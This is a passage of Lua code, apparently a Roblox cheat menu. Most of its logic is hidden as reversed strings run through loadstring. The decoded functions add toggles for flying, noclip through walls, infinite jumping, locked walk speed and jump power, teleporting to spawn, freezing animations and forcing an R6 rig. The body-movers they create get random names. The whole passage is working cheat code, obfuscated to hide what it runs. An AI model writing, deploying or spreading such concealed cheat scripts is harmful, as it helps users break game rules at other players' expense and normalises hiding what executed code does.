)"oryGydoB"(wen.ecnatsnI = gb lacol		
orez3v = yticoleV.vb		
orez3v = ecroFxaM.vb		
toor = tneraP.vb		
emaNreldnaHyticolevv = emaN.vb		
)"yticoleVydoB"(wen.ecnatsnI = vb lacol		
)retcarahC.reyalPlacoL(tooRteg = toor lacol		
)(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL = 1ylfmv	

05 = D.gb	
0001 = P.gb	
fni3v = euqroTxaM.gb	
toor = tneraP.gb	
emaNreldnaHorygv = emaN.gb	
)"oryGydoB"(wen.ecnatsnI = gb lacol	

orez3v = yticoleV.vb	
orez3v = ecroFxaM.vb	
toor = tneraP.vb	
emaNreldnaHyticolevv = emaN.vb	
)"yticoleVydoB"(wen.ecnatsnI = vb lacol	

))"eludoMlortnoC"(dlihCroFtiaW:)"eludoMreyalP"(dlihCroFtiaW:stpircSreyalP.reyalPlacoL(eriuqer = eludoMlortnoc lacol	

)9e9 ,9e9 ,9e9(wen.3rotceV = fni3v lacol	
)0 ,0 ,0(wen.3rotceV = orez3v lacol	
)(wen.3rotceV = enon3v lacol	
aremaCtnerruC.ecapskrow = aremac lacol	
)retcarahC.reyalPlacoL(tooRteg = toor lacol	

eurt = GNIYLFv	
)(ylfelibomvnu	
)(noitcnuf = ylfelibomv lacol

dne
)dne	
dne )(tcennocsiD:2ylfmv neht 2ylfmv fi		
dne )(tcennocsiD:1ylfmv neht 1ylfmv fi		
dne )(yortseD:)emaNreldnaHorygv(dlihCtsriFdniF:toor neht )emaNreldnaHorygv(dlihCtsriFdniF:toor fi		
dne )(yortseD:)emaNreldnaHyticolevv(dlihCtsriFdniF:toor neht )emaNreldnaHyticolevv(dlihCtsriFdniF:toor fi		
)retcarahC.reyalPlacoL(tooRteg = toor lacol		
eslaf = GNIYLFv		
)(noitcnuf(llacp	
)(noitcnuf = ylfelibomvnu lacol

lin = 2ylfmv lacol
lin = 1ylfmv lacol
)(gnirtSmodnar = emaNreldnaHorygv lacol
)(gnirtSmodnar = emaNreldnaHyticolevv lacol

lin = pUyeKylfv lacol
lin = nwoDyeKylfv lacol
eslaf = GNIYLFv lacol
1 = deepsylfelcihev lacol






)}
dne	
dne		
dne			
dne				
)pUgnitteG.epyTetatSdionamuH.munE(etatSegnahC:dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
neht retcarahc fi			
retcarahC.reyalPlacoL = retcarahc lacol			
)(stluafeDnoisilloCtes			
dne			
lin = noitcennoCpilcon				
)(tcennocsiD:noitcennoCpilcon				
neht noitcennoCpilcon fi			
esle		
)dne			
dne				
dne					
eslaf = edilloCnaC.trap						
neht )"traPesaB"(AsI:trap fi					
od ))(stnadnecseDteG:retcarahc(sriap ni trap ,_ rof				
dne nruter neht retcarahc ton fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = noitcennoCpilcon			
neht delbanEsi fi		

dne		
dne			
dne				
edilloCdluohs = edilloCnaC.trap					
dne					
dne						
kaerb							
eslaf = edilloCdluohs							
neht eman == emaN.trap fi						
od )straPedillocon(sriap ni eman ,_ rof					
eurt = edilloCdluohs lacol					
neht )"traPesaB"(AsI:trap fi				
od ))(nerdlihCteG:retcarahc(sriap ni trap ,_ rof			
dne nruter neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			
)(stluafeDnoisilloCtes noitcnuf lacol		

}"mrAreppUthgiR" ,"mrAreppUtfeL" ,"mrArewoLthgiR" ,"mrArewoLtfeL" ,"dnaHthgiR" ,"dnaHtfeL" ,"mrA thgiR" ,"mrA tfeL" ,"daeH"{ = straPedillocon lacol		
)delbanEsi(noitcnuf = kcabllac	
,".delbasid nehw yllacitamotua derotser si noisilloC .stcejbo dna sllaw hguorht klaw ot uoy swollA" = pitloot	
,tpircs = xobpuorg	
,"pilcoN" = emarf	
{(elggoTetaerC.G_

noitcennoCpilcon lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol









)}
,dne	
dne		
)0 ,5 ,0(wen.emarFC = emarFC.traPtooRdionamuh			
esle		
))0 ,5 ,0(wen.3rotceV + noitisoP.noitacoLnwaps(wen.emarFC = emarFC.traPtooRdionamuh			
neht noitacoLnwaps fi		
)"noitacoLnwapS"(ssalCfOdlihCtsriFdniF:ecapskrow = noitacoLnwaps lacol		
dne nruter neht traPtooRdionamuh ton fi		
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = traPtooRdionamuh lacol		
dne nruter neht retcarahc ton fi		
retcarahC.reyalPlacoL = retcarahc lacol		
)(noitcnuf = kcabllac	
,".semag emos ni etarucca eb ton yam ,nwaps ot kcab uoy stropeleT" = pitloot	
,tpircs = xobpuorg	
,"nwapSPT" = emarf	
{(nottuBetaerC.G_






)}
dne	
dne		
dne			
lin = nnoCpmuJfnI.G_				
)(tcennocsiD:nnoCpmuJfnI.G_				
neht nnoCpmuJfnI.G_ fi			
esle		
)dne			
dne				
)gnipmuJ.epyTetatSdionamuH.munE(etatSegnahC:dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
dne nruter neht retcarahc ton fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:tseuqeRpmuJ.ecivreStupnIresU = nnoCpmuJfnI.G_			

reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".yletinifni ria eht ni pmuj ot uoy swollA" = pitloot	
,tpircs = xobpuorg	
,"pmuJfnI" = emarf	
{(elggoTetaerC.G_












)}
dne	
dne		
dne			
dne				
05 = rewoPpmuJ.dionamuh					
eurt = rewoPpmuJesU.dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
neht retcarahc fi			
retcarahC.reyalPlacoL = retcarahc lacol			

dne			
lin = pooLrewoppmuj				
)(tcennocsiD:pooLrewoppmuj				
neht pooLrewoppmuj fi			
			
esle		
)dne			
dne				
dne					
eulaVrewoppmuj = rewoPpmuJ.dionamuh						
eurt = rewoPpmuJesU.dionamuh						
neht dionamuh fi					
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol					
neht retcarahc fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLrewoppmuj			
			
neht delbanEsi fi		

delbanEsi = delbanErewoppmuj		
)delbanEsi(noitcnuf = kcabllac	
,".rewop tsujda ot xobtxet eht esU .tes si rebmun tahw ot rewoppmuj ruoy skcoL" = pitloot	
,tpircs = xobpuorg	
,"rewoppmuJ" = emarf	
{(elggoTetaerC.G_

)}
dne	
dne		
dne			
dne				
dne					
eulaVrewoppmuj = rewoPpmuJ.dionamuh						
eurt = rewoPpmuJesU.dionamuh						
neht dionamuh fi					
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol					
neht retcarahc fi				
retcarahC.reyalPlacoL = retcarahc lacol				
neht delbanErewoppmuj fi			
			

eulav = eulaVrewoppmuj			
neht eulav fi		
)txet(rebmunot = eulav lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".05 si tluafed ,rewop pmuj ruoy egnahC" = pitloot	
,"regnahCrewoppmuJ" = emanxobtxet	
,"rewoppmuJ" = emarf	
{(xobtxeTetaerC.G_

lin = pooLrewoppmuj lacol
eslaf = delbanErewoppmuj lacol
05 = eulaVrewoppmuj lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol











)}
dne	
dne		
dne			
dne				
61 = deepSklaW.dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
neht retcarahc fi			
retcarahC.reyalPlacoL = retcarahc lacol			

dne			
lin = pooLdeepsklaw				
)(tcennocsiD:pooLdeepsklaw				
neht pooLdeepsklaw fi			
			
esle		
)dne			
dne				
dne					
eulaVdeepsklaw = deepSklaW.dionamuh						
neht dionamuh fi					
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol					
neht retcarahc fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLdeepsklaw			
			
neht delbanEsi fi		

delbanEsi = delbanEdeepsklaw		
)delbanEsi(noitcnuf = kcabllac	
,".deeps tsujda ot xobtxet eht esU .tes si deeps tahw ot deepsklaw ruoy skcoL" = pitloot	
,tpircs = xobpuorg	
,"deepsklaW" = emarf	
{(elggoTetaerC.G_
)}
dne	
dne		
dne			
dne				
dne					
eulaVdeepsklaw = deepSklaW.dionamuh						
neht dionamuh fi					
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol					
neht retcarahc fi				
retcarahC.reyalPlacoL = retcarahc lacol				
neht delbanEdeepsklaw fi			
			

eulav = eulaVdeepsklaw			
neht eulav fi		
)txet(rebmunot = eulav lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".61 si tluafed ,deeps klaw ruoy egnahC" = pitloot	
,"regnahCdeepsklaW" = emanxobtxet	
,"deepsklaW" = emarf	
{(xobtxeTetaerC.G_

lin = pooLdeepsklaw lacol
eslaf = delbanEdeepsklaw lacol
61 = eulaVdeepsklaw lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol










)}
dne	
dne		
dne			
)(YLFON				
esle			
)(ylfelibomnu				
neht eliboMnOsI fi			
esle		
dne			
)(YLFs				
esle			
)(ylfelibom				
neht eliboMnOsI fi			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".deeps tsujda ot xobtxet eht esU .edom ylf selbanE" = pitloot	
,tpircs = xobpuorg	
,"ylF" = emarf	
{(elggoTetaerC.G_

)}
dne	
dne		
05 / eulav = deepsylfyi			
neht eulav fi		
)txet(rebmunot = eulav lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".05 si tluafed ,deeps ylf ruoy egnahC" = pitloot	
,"regnahCylF" = emanxobtxet	
,"ylF" = emarf	
{(xobtxeTetaerC.G_

delbanEdraobyeK.ecivreStupnIresU ton dna delbanEhcuoT.ecivreStupnIresU = eliboMnOsI lacol


dne
)dne	
dne		
dne			
))05 * deepsylfyi( * Z.noitcerid( * rotceVkooL.emarFC.aremac - yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 < Z.noitcerid fi			
dne			
))05 * deepsylfyi( * Z.noitcerid( * rotceVkooL.emarFC.aremac - yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 > Z.noitcerid fi			
dne			
))05 * deepsylfyi( * X.noitcerid( * rotceVthgiR.emarFC.aremac + yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 < X.noitcerid fi			
dne			
))05 * deepsylfyi( * X.noitcerid( * rotceVthgiR.emarFC.aremac + yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 > X.noitcerid fi			
)(rotceVevoMteG:eludoMlortnoc = noitcerid lacol			

enon3v = yticoleV.reldnaHyticoleV			
emarFetanidrooC.aremac = emarFC.reldnaHoryG			
eurt = dnatSmroftalP.dionamuh			
fni3v = euqroTxaM.reldnaHoryG			
fni3v = ecroFxaM.reldnaHyticoleV			

)emaNreldnaHoryg(dlihCtsriFdniF:toor = reldnaHoryG lacol			
)emaNreldnaHyticolev(dlihCtsriFdniF:toor = reldnaHyticoleV lacol			
)"dionamuH"(AsIhcihWdlihCtsriFdniF:retcarahC.reyalPlacoL = dionamuh lacol			
neht )emaNreldnaHoryg(dlihCtsriFdniF:toor dna )emaNreldnaHyticolev(dlihCtsriFdniF:toor dna toor dna )"dionamuH"(AsIhcihWdlihCtsriFdniF:retcarahC.reyalPlacoL fi		
aremaCtnerruC.ecapskrow = aremac		
)retcarahC.reyalPlacoL(tooRteg = toor		
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = 2ylfm	

)dne	
05 = D.gb		
0001 = P.gb		
fni3v = euqroTxaM.gb		
toor = tneraP.gb		
emaNreldnaHoryg = emaN.gb		
)"oryGydoB"(wen.ecnatsnI = gb lacol		

orez3v = yticoleV.vb		
orez3v = ecroFxaM.vb		
toor = tneraP.vb		
emaNreldnaHyticolev = emaN.vb		
)"yticoleVydoB"(wen.ecnatsnI = vb lacol		

)retcarahC.reyalPlacoL(tooRteg = toor lacol		
)(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL = 1ylfm	

05 = D.gb	
0001 = P.gb	
fni3v = euqroTxaM.gb	
toor = tneraP.gb	
emaNreldnaHoryg = emaN.gb	
)"oryGydoB"(wen.ecnatsnI = gb lacol	

orez3v = yticoleV.vb	
orez3v = ecroFxaM.vb	
toor = tneraP.vb	
emaNreldnaHyticolev = emaN.vb	
)"yticoleVydoB"(wen.ecnatsnI = vb lacol	

))"eludoMlortnoC"(dlihCroFtiaW:)"eludoMreyalP"(dlihCroFtiaW:stpircSreyalP.reyalPlacoL(eriuqer = eludoMlortnoc lacol	

)9e9 ,9e9 ,9e9(wen.3rotceV = fni3v lacol	
)0 ,0 ,0(wen.3rotceV = orez3v lacol	
)(wen.3rotceV = enon3v lacol	
aremaCtnerruC.ecapskrow = aremac lacol	
)retcarahC.reyalPlacoL(tooRteg = toor lacol	

eurt = GNIYLF	
)(ylfelibomnu	
)(ylfelibom noitcnuf lacol

dne
)dne	
dne )(tcennocsiD:2ylfm neht 2ylfm fi		
dne )(tcennocsiD:1ylfm neht 1ylfm fi		
eslaf = dnatSmroftalP.)"dionamuH"(AsIhcihWdlihCtsriFdniF:retcarahC.reyalPlacoL		
dne		
)(yortseD:)emaNreldnaHoryg(dlihCtsriFdniF:toor			
neht )emaNreldnaHoryg(dlihCtsriFdniF:toor fi		
dne		
)(yortseD:)emaNreldnaHyticolev(dlihCtsriFdniF:toor			
neht )emaNreldnaHyticolev(dlihCtsriFdniF:toor fi		
)retcarahC.reyalPlacoL(tooRteg = toor lacol		
eslaf = GNIYLF		
)(noitcnuf(llacp	
)(ylfelibomnu noitcnuf lacol


dne
)(YLF	

)dne	
dne		
0 = E.LORTNOC			
neht Q.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = Q.LORTNOC			
neht E.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = R.LORTNOC			
neht D.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = L.LORTNOC			
neht A.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = B.LORTNOC			
neht S.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = F.LORTNOC			
neht W.edoCyeK.munE == edoCyeK.tupni fi		
dne nruter neht dessecorp fi		
)dessecorp ,tupni(noitcnuf(tcennoC:dednEtupnI.ecivreStupnIresU = pUyeKylf	

)dne	
)dne kcarT.epyTaremaC.munE = epyTaremaC.aremaCtnerruC.ecapskrow )(noitcnuf(llacp		
dne		
2 * deepsylfyi- = E.LORTNOC			
neht Q.edoCyeK.munE == edoCyeK.tupni fiesle		
2 * deepsylfyi = Q.LORTNOC			
neht E.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfyi = R.LORTNOC			
neht D.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfyi- = L.LORTNOC			
neht A.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfyi- = B.LORTNOC			
neht S.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfyi = F.LORTNOC			
neht W.edoCyeK.munE == edoCyeK.tupni fi		
dne nruter neht dessecorp fi		
)dessecorp ,tupni(noitcnuf(tcennoC:nageBtupnI.ecivreStupnIresU = nwoDyeKylf	

dne	
)dne		
dne eslaf = dnatSmroftalP.dionamuh neht dionamuh fi			

)(yortseD:VB			
)(yortseD:GB			
0 = DEEPS			
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOCl			
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOC			

GNIYLF ton litnu			
emarFC.aremac = emarFC.GB				
dne				
)0 ,0 ,0(wen.3rotceV = yticoleV.VB					
esle				
DEEPS * ))p.emarFC.aremac - )p.)0 ,2.0 * )E.LORTNOC + Q.LORTNOC + B.LORTNOCl + F.LORTNOCl( ,R.LORTNOCl + L.LORTNOCl(wen.emarFC * emarFC.aremac(( + ))B.LORTNOCl + F.LORTNOCl( * rotceVkooL.emarFC.aremac(( = yticoleV.VB					
neht 0 =~ DEEPS dna 0 == )E.LORTNOC + Q.LORTNOC( dna 0 == )B.LORTNOC + F.LORTNOC( dna 0 == )R.LORTNOC + L.LORTNOC( fiesle				
}R.LORTNOC = R ,L.LORTNOC = L ,B.LORTNOC = B ,F.LORTNOC = F{ = LORTNOCl					
DEEPS * ))p.emarFC.aremac - )p.)0 ,2.0 * )E.LORTNOC + Q.LORTNOC + B.LORTNOC + F.LORTNOC( ,R.LORTNOC + L.LORTNOC(wen.emarFC * emarFC.aremac(( + ))B.LORTNOC + F.LORTNOC( * rotceVkooL.emarFC.aremac(( = yticoleV.VB					
neht 0 =~ )E.LORTNOC + Q.LORTNOC( ro 0 =~ )B.LORTNOC + F.LORTNOC( ro 0 =~ )R.LORTNOC + L.LORTNOC( fi				

dne				
0 = DEEPS					
neht 0 =~ DEEPS dna )0 =~ E.LORTNOC + Q.LORTNOC ro 0 =~ B.LORTNOC + F.LORTNOC ro 0 =~ R.LORTNOC + L.LORTNOC( ton fiesle				
05 = DEEPS					
neht 0 =~ E.LORTNOC + Q.LORTNOC ro 0 =~ B.LORTNOC + F.LORTNOC ro 0 =~ R.LORTNOC + L.LORTNOC fi				

dne				
eurt = dnatSmroftalP.dionamuh					
neht dionamuh fi				
aremaCtnerruC.ecapskrow = aremac lacol				
)(tiaw.ksat taeper			
)(noitcnuf(nwaps.ksat		

)9e9 ,9e9 ,9e9(wen.3rotceV = ecroFxaM.VB		
)0 ,0 ,0(wen.3rotceV = yticoleV.VB		
emarFC.T = emarFC.GB		
)9e9 ,9e9 ,9e9(wen.3rotceV = euqroTxaM.GB		
T = tneraP.VB		
T = tneraP.GB		
4e9 = P.GB		
)'yticoleVydoB'(wen.ecnatsnI = VB lacol		
)'oryGydoB'(wen.ecnatsnI = GB lacol		
eurt = GNIYLF		
)(YLF noitcnuf lacol	

0 = DEEPS lacol	
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOCl lacol	
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOC lacol	

dne nruter neht T ton fi	
)rahc(tooRteg = T lacol	

dne	
dne )(tcennocsiD:pUyeKylf neht pUyeKylf fi		
dne )(tcennocsiD:nwoDyeKylf neht nwoDyeKylf fi		
neht pUyeKylf ro nwoDyeKylf fi	

dne nruter neht dionamuh ton fi	
)"dionamuH"(ssalCfOdlihCtsriFdniF:rahc = dionamuh lacol	

dne nruter neht rahc ton fi	
retcarahC.reyalPlacoL = rahc lacol	
)(YLFs noitcnuf lacol

dne
)dne motsuC.epyTaremaC.munE = epyTaremaC.aremaCtnerruC.ecapskrow )(noitcnuf(llacp	
dne	
eslaf = dnatSmroftalP.)'dionamuH'(ssalCfOdlihCtsriFdniF:retcarahC.reyalPlacoL		
neht )'dionamuH'(ssalCfOdlihCtsriFdniF:retcarahC.reyalPlacoL dna retcarahC.reyalPlacoL fi	
dne lin = pUyeKylf )(tcennocsiD:pUyeKylf neht pUyeKylf fi	
dne lin = nwoDyeKylf )(tcennocsiD:nwoDyeKylf neht nwoDyeKylf fi	
eslaf = GNIYLF	
)(YLFON noitcnuf lacol


)(gnirtSmodnar = emaNreldnaHoryg lacol
)(gnirtSmodnar = emaNreldnaHyticolev lacol

dne
tluser nruter	
dne	
)dnar ,dnar(bus:srahc .. tluser = tluser		
)srahc# ,1(modnar.htam = dnar lacol		
od 01 ,1 = i rof	
"" = tluser lacol	
"9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA" = srahc lacol	
)(gnirtSmodnar noitcnuf lacol

dne
)"osroTreppU"(dlihCtsriFdniF:rahc ro )"osroT"(dlihCtsriFdniF:rahc ro )"traPtooRdionamuH"(dlihCtsriFdniF:rahc nruter	
)rahc(tooRteg noitcnuf lacol

lin = 2ylfm lacol
lin = 1ylfm lacol
lin = pUyeKylf lacol
lin = nwoDyeKylf lacol
1 = deepsylfyi lacol
eslaf = GNIYLF lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol









dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_179);
local function C_201()
local script = _llza[_sc(50,48,49)];
loadstring(([[)}
dne	
dne		
dne			
)1(deepStsujdA:kcart				
od ))(skcarTnoitaminAgniyalPteG:dionamuh(sriap ni kcart ,_ rof			
dne			
eslaf = delbasiD.etamina				
neht etamina fi			
esle		
dne			
)0(deepStsujdA:kcart				
od ))(skcarTnoitaminAgniyalPteG:dionamuh(sriap ni kcart ,_ rof			
dne			
eurt = delbasiD.etamina				
neht etamina fi			
neht delbanEsi fi		

)"etaminA"(dlihCtsriFdniF:retcarahc = etamina lacol		
dne nruter neht dionamuh ton fi		
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol		
dne nruter neht retcarahc ton fi		
retcarahC.reyalPlacoL = retcarahc lacol		
)delbanEsi(noitcnuf = kcabllac	
,"snoitaminA ezeerfnU" = txeTdelggot	
,".snoitamina ruoy sezeerF" = pitloot	
,tpircs = xobpuorg	
,"minAezeerF" = emarf	
{(elggoTnottuBetaerC.G_








)}
,dne	
eslaf nruter		
dne		
eurt nruter			
)(retcarahCteseR.derahs			
neht retcarahCteseR.derahs fi		
)(noitcnuf = kcabllac	
,"roloCemarf" = roloctxetdloh	
,eurt = lausivdloh	
,")sf1.%( ...dloH" = txetdloh	
,1 = emitdloh	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!teser retcarahC" = egasseMretfa	
,".dnoces 1 rof dloh ,retcarahc ruoy steseR" = pitloot	
,tpircs = xobpuorg	
,"teseR" = emarf	
{(nottuBetaerC.G_









)}
dne	
dne		
dne			
dne				
)muH(snoitaminApotS					
)(snoitaminAerotseR					
)muH(snoitaminApotS					
neht 51R.epyTgiRdionamuH.munE == epyTgiR.muH dna muH fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:rahC = muH lacol				
neht rahC fi			
retcarahC.reyalPlacoL = rahC lacol			

dne			
lin = noitcennoC6r				
)(tcennocsiD:noitcennoC6r				
neht noitcennoC6r fi			
			
esle		
)retcarahCeldnaH(tcennoC:deddAretcarahC.reyalPlacoL = noitcennoC6r			
)retcarahC.reyalPlacoL(retcarahCeldnaH			

dne			
)rahC(etaminA				
dne nruter neht 51R.epyTgiRdionamuH.munE =~ epyTgiR.muH ro muH ton fi				
)"dionamuH"(dlihCroFtiaW:rahC = muH lacol				
dne nruter neht delbanE6Rsi ton ro rahC ton fi				
)rahC(retcarahCeldnaH noitcnuf lacol			
			
neht delbanEsi fi		

delbanEsi = delbanE6Rsi		
)delbanEsi(noitcnuf = kcabllac	
,".6R ot epyt gir s'retcarahc ruoy secroF" = pitloot	
,tpircs = xobpuorg	
,"6R" = emarf	
{(elggoTetaerC.G_

dne
)dionamuH(snoitaminApotS	
)etaminA(snoitaminAdaoL	
)dionamuH(snoitaminApotS	

 dne nruter neht delbanE6Rsi ton fi	

)5.0(tiaw.ksat	
)"etaminA"(dlihCroFtiaW:retcarahC = etaminA lacol	
)"dionamuH"(dlihCroFtiaW:retcarahC = dionamuH lacol	

 dne nruter neht delbanE6Rsi ton fi	
)retcarahC(etaminA noitcnuf lacol

dne
}{ = ehcaCminA	
dne	
dne		
dI = dInoitaminA.dlihC			
neht dlihC fi		
]2[ataD ,]1[ataD = dI ,dlihC lacol		
od ehcaCminA ni ataD ,_ rof	
)(snoitaminAerotseR noitcnuf lacol

dne
dne	
dne		
)DI(tamrof:)"s%//:ditessaxbr"( = dInoitaminA.dlihC			
)}dInoitaminA.dlihC ,dlihC{ ,ehcaCminA(tresni.elbat			
dne eunitnoc neht dlihC ton fi			
)emaNdlihC(dlihCtsriFdniF:dnuoF = dlihC lacol			
dne eunitnoc neht dnuoF ton fi			
))(rewol:noitaminA(dlihCtsriFdniF:etaminA = dnuoF lacol			
od dlihC ni DI ,emaNdlihC rof		
od snoitaminA ni dlihC ,noitaminA rof	
}{ = ehcaCminA	
)etaminA(snoitaminAdaoL noitcnuf lacol

dne
dne	
)(potS:noitaminA		
od )(skcarTnoitaminAgniyalPteG:dionamuH ni noitaminA ,_ rof	
)dionamuH(snoitaminApotS noitcnuf lacol

}
}	
86139902521 = minAtiS		
{ = tiS	
,}	
05128902521 = minAbmilC		
{ = bmilC	
,}	
17527902521 = minAllaF		
{ = llaF	
,}	
62526112521 = 2noitaminA		
,73685112521 = 1noitaminA		
{ = eldI	
,}	
58408802521 = minApmuJ		
{ = pmuJ	
,}	
69625181521 = minAklaW		
{ = klaW	
,}	
69625181521 = minAnuR		
{ = nuR	
{ = snoitaminA lacol


eslaf = delbanE6Rsi lacol
lin = noitcennoC6r lacol
}{ = ehcaCminA lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol









dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_201);
local function C_22c()
local script = _llza[_sc(50,50,99)];
loadstring(([[)}
dne	
dne		
dne			
lin = noitcennoCnwapser				
)(tcennocsiD:noitcennoCnwapser				
neht noitcennoCnwapser fi			
lin = noitisoPnwapseRtsaL.G_			
esle		
)dne			
dne				
noitisoPnwapseRtsaL.G_ = emarFC.prh					
)10.0(tiaw.ksat					
)"traPtooRdionamuH"(dlihCroFtiaW:retcarahc = prh lacol					
neht noitisoPnwapseRtsaL.G_ dna delbanEnwapser fi				
)retcarahc(noitcnuf(tcennoC:deddAretcarahC.reyalPlacoL = noitcennoCnwapser			
dne )(tcennocsiD:noitcennoCnwapser neht noitcennoCnwapser fi			
)dne			
dne				
dne					
dne						
